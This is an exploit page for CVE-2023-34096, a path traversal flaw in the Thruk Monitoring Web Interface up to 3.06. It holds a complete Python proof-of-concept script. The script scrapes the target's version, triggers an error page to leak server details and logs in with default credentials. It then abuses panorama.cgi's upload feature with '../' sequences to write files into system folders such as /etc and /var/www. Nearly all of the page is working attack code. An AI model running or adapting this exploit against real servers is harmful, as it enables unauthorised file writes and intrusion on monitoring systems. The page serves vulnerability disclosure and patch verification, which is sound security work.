	
<html><head><title>Thruk Monitoring Web Interface 3.06 Path Traversal</TITLE><meta http-equiv="Content-Type" content="text/html; charset=utf-8"></HEAD><body><pre># Exploit Title: Path Traversal Vulnerability in Thruk Monitoring Web Interface ≤ 3.06
# Date: 08-Jun-2023
# Exploit Author: Galoget Latorre (@galoget)
# CVE: CVE-2023-34096 (Galoget Latorre)
# Vendor Homepage: https://thruk.org/
# Software Link: https://github.com/sni/Thruk/archive/refs/tags/v3.06.zip
# Software Link + Exploit + PoC (Backup): https://github.com/galoget/Thruk-CVE-2023-34096
# CVE Author Blog: https://galogetlatorre.blogspot.com/2023/06/cve-2023-34096-path-traversal-thruk.html
# GitHub Security Advisory: https://github.com/sni/Thruk/security/advisories/GHSA-vhqc-649h-994h
# Affected Versions: &lt;= 3.06
# Language: Python 3.x
# Tested on:
#  - Ubuntu 22.04.5 LTS 64-bit
#  - Debian GNU/Linux 10 (buster) 64-bit
#  - Kali GNU/Linux 2023.1 64-bit
#  - CentOS GNU/Linux 8.5.2111 64-bit


#!/usr/bin/python3
# -*- coding:utf-8 -*-

import sys
import warnings
import requests
from bs4 import BeautifulSoup
from termcolor import cprint


# Usage: python3 exploit.py &lt;target.site&gt;
# Example: python3 exploit.py http://127.0.0.1/thruk/


# Disable warnings
warnings.filterwarnings(&#039;ignore&#039;)


# Set headers
headers = {
    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&quot;
}


def banner():
    &quot;&quot;&quot;
    Function to print the banner
    &quot;&quot;&quot;

    banner_text = &quot;&quot;&quot;
 __     __     __   __  __  __      __        __   __   __  
/  \\  /|_  __   _) /  \\  _)  _) __   _) |__| /  \\ (__\\ /__  
\\__ \\/ |__     /__ \\__/ /__ __)     __)    | \\__/  __/ \\__) 

                                                               
Path Traversal Vulnerability in Thruk Monitoring Web Interface ≤ 3.06
Exploit &amp; CVE Author: Galoget Latorre (@galoget)
LinkedIn: https://www.linkedin.com/in/galoget
&quot;&quot;&quot;
    print(banner_text)


def usage_instructions():
    &quot;&quot;&quot;
    Function that validates the number of arguments.
    The application MUST have 2 arguments:
    - [0]: Name of the script
    - [1]: Target URL (Thruk Base URL)
    &quot;&quot;&quot;
    if len(sys.argv) != 2:
        print(&quot;Usage: python3 exploit.py &lt;target.site&gt;&quot;)
        print(&quot;Example: python3 exploit.py http://127.0.0.1/thruk/&quot;)
        sys.exit(0)


def check_vulnerability(thruk_version):
    &quot;&quot;&quot;
    Function to check if the recovered version is vulnerable to CVE-2023-34096.
    Prints additional information about the vulnerability.
    &quot;&quot;&quot;
    try:
        if float(thruk_version[1:5]) &lt;= 3.06:
            if float(thruk_version[4:].replace(&quot;-&quot;, &quot;.&quot;)) &lt; 6.2:
                cprint(&quot;[+] &quot;, &quot;green&quot;, attrs=[&#039;bold&#039;], end = &quot;&quot;)
                print(&quot;This version of Thruk is &quot;, end = &quot;&quot;)
                cprint(&quot;VULNERABLE &quot;, &quot;red&quot;, attrs=[&#039;bold&#039;], end = &quot;&quot;)
                print(&quot;to CVE-2023-34096!&quot;)
                print(&quot; |  CVE Author Blog: https://galogetlatorre.blogspot.com/2023/06/cve-2023-34096-path-traversal-thruk.html&quot;)
                print(&quot; |  GitHub Security Advisory: https://github.com/sni/Thruk/security/advisories/GHSA-vhqc-649h-994h&quot;)
                print(&quot; |  CVE MITRE: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-34096&quot;)
                print(&quot; |  CVE NVD NIST: https://nvd.nist.gov/vuln/detail/CVE-2023-34096&quot;)
                print(&quot; |  Thruk Changelog: https://www.thruk.org/changelog.html&quot;)
                print(&quot; |  Fixed version: 3.06-2+&quot;)
                print(&quot;&quot;)
                return True
            else:
                cprint(&quot;[-] &quot;, &quot;red&quot;, attrs=[&#039;bold&#039;], end = &quot;&quot;)
                print(&quot;It looks like this version of Thruk is NOT VULNERABLE to CVE-2023-34096.&quot;)
                return False
    except:
        cprint(&quot;[-] &quot;, &quot;red&quot;, attrs=[&#039;bold&#039;], end = &quot;&quot;)
        print(&quot;There was an error parsing Thruk&#039;s version.\n&quot;)
        return False


def get_thruk_version():
    &quot;&quot;&quot;
    Function to get Thruk&#039;s version via web scraping.
    It also verifies the title of the website to check if the target is a Thruk instance.
    &quot;&quot;&quot;
    response = requests.get(target, headers=headers, allow_redirects=True, verify=False, timeout=10)
    html_soup = BeautifulSoup(response.text, &quot;html.parser&quot;)

    if &quot;&lt;title&gt;Thruk Monitoring Webinterface&lt;/title&gt;&quot; not in response.text:
        cprint(&quot;[-] &quot;, &quot;red&quot;, attrs=[&#039;bold&#039;], end = &quot;&quot;)
        print(&quot;Verify if the URL is correct and points to a Thruk Monitoring Web Interface.&quot;)
        sys.exit(-1)
    else:
        # Extract version anchor tag
        version_link = html_soup.find_all(&quot;a&quot;, {&quot;class&quot;: &quot;link text-sm&quot;})

        if len(version_link) == 1 and version_link[0].has_attr(&#039;href&#039;):
            thruk_version = version_link[0].text.strip()
            cprint(&quot;[+] &quot;, &quot;green&quot;, attrs=[&#039;bold&#039;], end = &quot;&quot;)
            print(f&quot;Detected Thruk Version (Public Banner): {thruk_version}\n&quot;)
            return thruk_version
        else:
            cprint(&quot;[-] &quot;, &quot;red&quot;, attrs=[&#039;bold&#039;], end = &quot;&quot;)
            print(&quot;There was an error retrieving Thruk&#039;s version.&quot;)
            sys.exit(-1)


def get_error_info():
    &quot;&quot;&quot;
    Function to cause an error in the target Thruk instance and collect additional information via web scraping.
    &quot;&quot;&quot;
    # URL that will cause an error
    error_url = target + &quot;//cgi-bin/login.cgi&quot;

    # Retrieve Any initial Cookies
    error_response = requests.get(error_url,
                                  headers=headers,
                                  allow_redirects=False,
                                  verify=False,
                                  timeout=10)

    cprint(&quot;[*] &quot;, &quot;blue&quot;, attrs=[&#039;bold&#039;], end = &quot;&quot;)
    print(&quot;Trying to retrieve additional information...\n&quot;)
    try:
        # Search for the error tag
        html_soup = BeautifulSoup(error_response.text, &quot;html.parser&quot;)
        error_report = html_soup.find_all(&quot;pre&quot;, {&quot;class&quot;: &quot;text-left mt-5&quot;})[0].text
        if len(error_report) &gt; 0:
            # Print Error Info
            error_report = error_report[error_report.find(&quot;Version&quot;):error_report.find(&quot;\n\nStack&quot;)]
            cprint(&quot;[+] &quot;, &quot;green&quot;, attrs=[&#039;bold&#039;], end = &quot;&quot;)
            print(&quot;Recovered Information: \n&quot;)
            parsed_error_report = error_report.split(&quot;\n&quot;)
            for error_line in parsed_error_report:
                print(f&quot;     {error_line}&quot;)
    except:
        cprint(&quot;[-] &quot;, &quot;red&quot;, attrs=[&#039;bold&#039;], end = &quot;&quot;)
        print(&quot;No additional information available.\n&quot;)


def get_thruk_session_auto_login():
    &quot;&quot;&quot;
    Function to login into the Thruk instance and retrieve a valid session.
    It will use default Thruk&#039;s credentials available here:
    - https://www.thruk.org/documentation/install.html
    
    Change credentials if required.
    &quot;&quot;&quot;
    # Default Credentials - Change if required
    username = &quot;thrukadmin&quot; # CHANGE ME
    password = &quot;thrukadmin&quot; # CHANGE ME
    params = {&quot;login&quot;: username, &quot;password&quot;: password}

    cprint(&quot;[*] &quot;, &quot;blue&quot;, attrs=[&#039;bold&#039;], end = &quot;&quot;)
    print(f&quot;Trying to autenticate with provided credentials: {username}/{password}\n&quot;)

    # Define Login URL
    login_url = &quot;cgi-bin/login.cgi&quot;

    session = requests.Session()
    # Retrieve Any initial Cookies
    session.get(target, headers=headers, allow_redirects=True, verify=False)

    # Login and get thruk_auth Cookie
    session.post(target + login_url, data=params, headers=headers, allow_redirects=False, verify=False)

    # Get Cookies as dictionary
    cookies = session.cookies.get_dict()

    # Successful Login
    if cookies.get(&#039;thruk_auth&#039;) is not None:
        cprint(&quot;[+] &quot;, &quot;green&quot;, attrs=[&#039;bold&#039;], end = &quot;&quot;)
        print(&quot;Successful Authentication!\n&quot;)
        cprint(&quot;[+] &quot;, &quot;green&quot;, attrs=[&#039;bold&#039;], end = &quot;&quot;)
        print(f&quot;Login Cookie: thruk_auth={cookies.get(&#039;thruk_auth&#039;)}\n&quot;)
        return session
    # Failed Login
    else:
        if cookies.get(&#039;thruk_message&#039;) == &quot;fail_message~~login%20failed&quot;:
            cprint(&quot;[-] &quot;, &quot;red&quot;, attrs=[&#039;bold&#039;], end = &quot;&quot;)
            print(&quot;Login Failed, check your credentials.&quot;)
            sys.exit(401)


def cve_2023_34096_exploit_path_traversal(logged_session):
    &quot;&quot;&quot;
    Function that attempts to exploit the Path Traversal Vulnerability.
    The exploit will try to upload a PoC file to multiple common folders.
    This to prevent permissions errors to cause false negatives.
    &quot;&quot;&quot;
    cprint(&quot;[*] &quot;, &quot;blue&quot;, attrs=[&#039;bold&#039;], end = &quot;&quot;)
    print(&quot;Trying to exploit: &quot;, end = &quot;&quot;)
    cprint(&quot;CVE-2023-34096 - Path Traversal\n&quot;, &quot;yellow&quot;, attrs=[&#039;bold&#039;])

    # Define Upload URL
    upload_url = &quot;cgi-bin/panorama.cgi&quot;

    # Absolute paths
    common_folders = [&quot;/tmp/&quot;,
                      &quot;/etc/thruk/plugins/plugins-enabled/&quot;,
                      &quot;/etc/thruk/panorama/&quot;,
                      &quot;/etc/thruk/bp/&quot;,
                      &quot;/etc/thruk/thruk_local.d/&quot;,
                      &quot;/var/www/&quot;,
                      &quot;/var/www/html/&quot;,
                      &quot;/etc/&quot;,
    ]

    # Upload PoC file to each folder
    for target_folder in common_folders:
        # PoC file extension is jpg due to regex validations of Thruk.
        # Nevertheless this issue can still cause damage in different ways to the affected instance.
        files = {&#039;image&#039;: (&quot;exploit.jpg&quot;, &quot;CVE-2023-34096-Exploit-PoC-by-galoget&quot;)}
        data = {&quot;task&quot;: &quot;upload&quot;,
                &quot;type&quot;: &quot;image&quot;,
                &quot;location&quot;: f&quot;backgrounds/../../../..{target_folder}&quot;
        }

        upload_response = logged_session.post(target + upload_url,
                                    data=data,
                                    files=files,
                                    headers=headers,
                                    allow_redirects=False,
                                    verify=False)

        try:
            upload_response = upload_response.json()
            if upload_response.get(&quot;msg&quot;) == &quot;Upload successfull&quot; and upload_response.get(&quot;success&quot;) is True:
                cprint(&quot;[+] &quot;, &quot;green&quot;, attrs=[&#039;bold&#039;], end = &quot;&quot;)
                print(f&quot;File successfully uploaded to folder: {target_folder}{files.get(&#039;image&#039;)[0]}\n&quot;)
            elif upload_response.get(&quot;msg&quot;) == &quot;Fileupload must use existing and writable folder.&quot;:
                cprint(&quot;[-] &quot;, &quot;red&quot;, attrs=[&#039;bold&#039;], end = &quot;&quot;)
                print(f&quot;File upload to folder \&#039;{target_folder}{files.get(&#039;image&#039;)[0]}\&#039; failed due to write permissions or non-existent folder!\n&quot;)
            else:
                cprint(&quot;[-] &quot;, &quot;red&quot;, attrs=[&#039;bold&#039;], end = &quot;&quot;)
                print(&quot;File upload failed.\n&quot;)
        except:
            cprint(&quot;[-] &quot;, &quot;red&quot;, attrs=[&#039;bold&#039;], end = &quot;&quot;)
            print(&quot;File upload failed.\n&quot;)



if __name__ == &quot;__main__&quot;:
    banner()
    usage_instructions()

    # Change this with the domain or IP address to attack
    if sys.argv[1] and sys.argv[1].startswith(&quot;http&quot;):
        target = sys.argv[1]
    else:
        target = &quot;http://127.0.0.1/thruk/&quot;

    # Prepare Base Target URL
    if not target.endswith(&#039;/&#039;):
        target += &quot;/&quot;

    cprint(&quot;[+] &quot;, &quot;green&quot;, attrs=[&#039;bold&#039;], end = &quot;&quot;)
    print(f&quot;Target URL: {target}\n&quot;)

    # Get Thruk version via web scraping
    scraped_thruk_version = get_thruk_version()

    # Send a request that will generate an error and collect extra info
    get_error_info()

    # Check if the instance is vulnerable to CVE-2023-34096
    vulnerable_status = check_vulnerability(scraped_thruk_version)

    if vulnerable_status:
        cprint(&quot;[+] &quot;, &quot;green&quot;, attrs=[&#039;bold&#039;], end = &quot;&quot;)
        print(&quot;The Thruk version found in this host is vulnerable to CVE-2023-34096. Do you want to try to exploit it?&quot;)

        # Confirm exploitation
        option = input(&quot;\nChoice (Y/N): &quot;).lower()
        print(&quot;&quot;)

        if option == &quot;y&quot;:
            cprint(&quot;[*] &quot;, &quot;blue&quot;, attrs=[&#039;bold&#039;], end = &quot;&quot;)
            print(&quot;The tool will attempt to exploit the vulnerability by uploading a PoC file to common folders...\n&quot;)
            # Login into Thruk instance
            valid_session = get_thruk_session_auto_login()
            # Exploit Path Traversal Vulnerability
            cve_2023_34096_exploit_path_traversal(valid_session)
        elif option == &quot;n&quot;:
            cprint(&quot;[*] &quot;, &quot;blue&quot;, attrs=[&#039;bold&#039;], end = &quot;&quot;)
            print(&quot;No exploitation attempts were performed, Goodbye!\n&quot;)
            sys.exit(0)
        else:
            cprint(&quot;[-] &quot;, &quot;red&quot;, attrs=[&#039;bold&#039;], end = &quot;&quot;)
            print(&quot;Unknown option entered.&quot;)
            sys.exit(1)
    else:
        cprint(&quot;[-] &quot;, &quot;red&quot;, attrs=[&#039;bold&#039;], end = &quot;&quot;)
        print(&quot;The current Thruk&#039;s version is NOT VULNERABLE to CVE-2023-34096.&quot;)
        sys.exit(2)
</PRE></BODY></HTML>